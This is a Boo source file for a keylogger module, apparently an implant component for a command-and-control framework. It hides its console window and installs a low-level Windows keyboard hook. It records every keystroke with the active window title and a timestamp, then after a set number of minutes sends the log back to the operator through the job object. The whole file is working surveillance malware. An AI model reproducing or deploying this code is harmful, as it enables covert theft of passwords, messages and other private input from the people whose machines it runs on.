/*
    This module is inspired from https://github.com/BlackVikingPro/Keylogger
    and from @checkymander https://github.com/obscuritylabs/HastySeries/tree/master/HastyStroke
*/
import System
import System.Diagnostics
import System.Windows
import System.Windows.Forms
import System.Runtime.InteropServices
import System.Text
import System.Threading
import System.Windows.Input


public class InterceptKeys(Form):
    private static _job as duck
    private static final WH_KEYBOARD_LL = 13
    private static final WM_KEYDOWN = 256
    private static _proc as LowLevelKeyboardProc = HookCallback
    private static _hookID as IntPtr = IntPtr.Zero
    private static results = ''
    private static oldWindow = ''


    public def constructor(job as duck):
        _job = job
        Main()

    public static def returnCapture():
        _job.SendJobResults(results);

    public static def Main():

        handle  = GetConsoleWindow()

        // Hide
        ShowWindow(handle, SW_HIDE)


        STAThread as Thread = Thread() do:
            Thread.CurrentThread.IsBackground = true
            Thread.Sleep((TimeSpan.FromMinutes(MINUTES).TotalMilliseconds cast int))
            returnCapture()

        STAThread.SetApartmentState(ApartmentState.STA)
        STAThread.Start()

        _hookID = SetHook(_proc)
        Application.Run()
        UnhookWindowsHookEx(_hookID)


    private static def SetHook(proc as LowLevelKeyboardProc) as IntPtr:
        using curProcess = Process.GetCurrentProcess():
            using curModule = curProcess.MainModule:
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0)

    private callable LowLevelKeyboardProc(nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr

    private static def HookCallback(nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr:

        window = GetActiveWindowTitle()
        if (window != oldWindow):
            results += "\r\n"
            oldWindow = window;
            results += "\r\n" + DateTime.Now + "\r\n" + window + "\r\n--------------------------\r\n"


        if (nCode >= 0) and (wParam == (WM_KEYDOWN cast IntPtr)):
            vkCode as int = Marshal.ReadInt32(lParam)
            theKeyPressed = (vkCode cast Keys)
            if theKeyPressed == Keys.Add:
                results += '[Add]'
            elif theKeyPressed == Keys.Attn:
                results += '[Attn]'
            elif theKeyPressed == Keys.Clear:
                results += '[Clear]'
            elif theKeyPressed == Keys.Down:
                results += '[Down Arrow]'
            elif theKeyPressed == Keys.Up:
                results += '[Up Arrow]'
            elif theKeyPressed == Keys.Left:
                results += '[Left Arrow]'
            elif theKeyPressed == Keys.Right:
                results += '[Right Arrow]'
            elif theKeyPressed == Keys.Escape:
                results += '[ESC]'
            elif theKeyPressed == Keys.Tab:
                results += '[Tab]'
            elif theKeyPressed == Keys.LWin:
                results += '[Left WinKey]'
            elif theKeyPressed == Keys.RWin:
                results += '[Right WinKey]'
            elif theKeyPressed == Keys.PrintScreen:
                results += '[PrtScrn]'
            elif theKeyPressed == Keys.D0:
                if isShift():
                    results += ')'
                else:
                    results += '0'
            elif theKeyPressed == Keys.D1:
                if isShift():
                    results += '!'
                else:
                    results += '1'
            elif theKeyPressed == Keys.D2:
                if isShift():
                    results += '@'
                else:
                    results += '2'
            elif theKeyPressed == Keys.D3:
                if isShift():
                    results += '#'
                else:
                    results += '3'
            elif theKeyPressed == Keys.D4:
                if isShift():
                    results += '$'
                else:
                    results += '4'
            elif theKeyPressed == Keys.D5:
                if isShift():
                    results += '%'
                else:
                    results += '5'
            elif theKeyPressed == Keys.D6:
                if isShift():
                    results += '^'
                else:
                    results += '6'
            elif theKeyPressed == Keys.D7:
                if isShift():
                    results += '&'
                else:
                    results += '7'
            elif theKeyPressed == Keys.D8:
                if isShift():
                    results += '*'
                else:
                    results += '8'
            elif theKeyPressed == Keys.D9:
                if isShift():
                    results += '('
                else:
                    results += '9'
            elif theKeyPressed == Keys.Space:
                results += ' '
            elif theKeyPressed == Keys.NumLock:
                results += '[NumLock]'
            elif theKeyPressed == Keys.Alt:
                results += '[Alt]'
            elif theKeyPressed == Keys.LControlKey:
                results += '[Left Control]'
            elif theKeyPressed == Keys.RControlKey:
                results += '[Right Control]'
            elif theKeyPressed == Keys.CapsLock:
                results += '[CapsLock]'
            elif theKeyPressed == Keys.Delete:
                results += '[Delete]'
            elif theKeyPressed == Keys.Enter:
                results += '[Enter]'
            elif theKeyPressed == Keys.OemSemicolon:
                if isShift():
                    results += ':'
                else:
                    results += ';'
            elif theKeyPressed == Keys.Oemtilde:
                if isShift():
                    results += '~'
                else:
                    results += '`'
            elif theKeyPressed == Keys.Oemplus:
                if isShift():
                    results += '+'
                else:
                    results += '='
            elif theKeyPressed == Keys.OemMinus:
                if isShift():
                    results += '_'
                else:
                    results += '-'
            elif theKeyPressed == Keys.Oemcomma:
                if isShift():
                    results += '<'
                else:
                    results += ','
            elif theKeyPressed == Keys.OemPeriod:
                if isShift():
                    results += '>'
                else:
                    results += '.'
            elif theKeyPressed == Keys.OemQuestion:
                if isShift():
                    results += '?'
                else:
                    results += '/'
            elif theKeyPressed == Keys.OemPipe:
                if isShift():
                    results += '|'
                else:
                    results += '\\'
            elif theKeyPressed == Keys.OemQuotes:
                if isShift():
                    results += '"'
                else:
                    results += "'"
            elif theKeyPressed == Keys.OemCloseBrackets:
                if isShift():
                    results += ']'
                else:
                    results += '}'
            elif theKeyPressed == Keys.OemOpenBrackets:
                if isShift():
                    results += '['
                else:
                    results += '{'
            elif theKeyPressed == Keys.Back:
                results += '[Backspace]'
            elif theKeyPressed == Keys.PrintScreen:
                results += '[PrintScreen]'
            elif theKeyPressed == Keys.End:
                results += '[End]'
            elif theKeyPressed == Keys.Insert:
                results += '[Insert]'
            elif theKeyPressed == Keys.Home:
                results += '[Home]'
            elif theKeyPressed == Keys.PageUp:
                results += '[PageUp]'
            elif theKeyPressed == Keys.PageDown:
                results += '[PageDown]'
            elif theKeyPressed.ToString().Contains('Num'):
                results += '[' + theKeyPressed + ']'
            elif theKeyPressed == Keys.Multiply:
                results += '[Multiply]'
            elif theKeyPressed == Keys.Subtract:
                results += '[Subtract]'
            elif theKeyPressed == Keys.Divide:
                results += '[Divide]'
            elif theKeyPressed == Keys.RShiftKey:
                results += '[Right Shift]'
            elif theKeyPressed == Keys.Scroll:
                results += '[Scroll Lock]'
            elif theKeyPressed == Keys.Pause:
                results += '[Pause Break]'
            elif theKeyPressed == Keys.LShiftKey:
                results += '[Left Shift]'
            elif theKeyPressed == Keys.LMenu:
                results += '[Left Menu]'
            elif theKeyPressed.ToString().Contains('Oem'):
                results += '[' + theKeyPressed + ']'
            elif theKeyPressed.ToString().Contains('F') and theKeyPressed.ToString().Length >1:
                results += '[' + theKeyPressed + ']'
            elif theKeyPressed.ToString().Contains('D') and theKeyPressed.ToString().Length >1:
                results += '[' + theKeyPressed + ']'
            else:
                t = (vkCode cast Keys)
                isCapslock  = Control.IsKeyLocked(Keys.CapsLock)
                if isCapslock and isShift():
                    results += t.ToString().ToLower()
                elif isCapslock and (not isShift()):
                    results += t.ToString()
                elif (not isCapslock) and isShift():
                    results += t.ToString()
                else:
                    results += t.ToString().ToLower()
                //results += theKeyPressed

        return CallNextHookEx(_hookID, nCode, wParam, lParam)


    private static def GetActiveWindowTitle() as string:
        nChars = 256
        Buff = StringBuilder(nChars)
        handle as IntPtr = GetForegroundWindow()

        if GetWindowText(handle, Buff, nChars) > 0:
            return Buff.ToString()
        return ''

    private static def isShift() as bool:

        if Control.ModifierKeys == Keys.Shift:
            return true
        else:
            return false

    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def SetWindowsHookEx(idHook as int, lpfn as LowLevelKeyboardProc, hMod as IntPtr, dwThreadId as uint) as IntPtr:
        pass

    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def UnhookWindowsHookEx(hhk as IntPtr) as bool:
        pass

    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def CallNextHookEx(hhk as IntPtr, nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr:
        pass


    [DllImport('kernel32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def GetModuleHandle(lpModuleName as string) as IntPtr:
        pass

    [DllImport('kernel32.dll')]
    private static def GetConsoleWindow() as IntPtr:
        pass

    [DllImport('user32.dll')]
    private static def ShowWindow(hWnd as IntPtr, nCmdShow as int) as bool:
        pass

    [DllImport('user32.dll')]
    private static def GetForegroundWindow() as IntPtr:
        pass

    [DllImport('user32.dll')]
    private static def GetWindowText(hWnd as IntPtr, text as StringBuilder, count as int) as int:
        pass


    private static final SW_HIDE = 0

public static def Start(job as duck):
    Application.Run(InterceptKeys(job))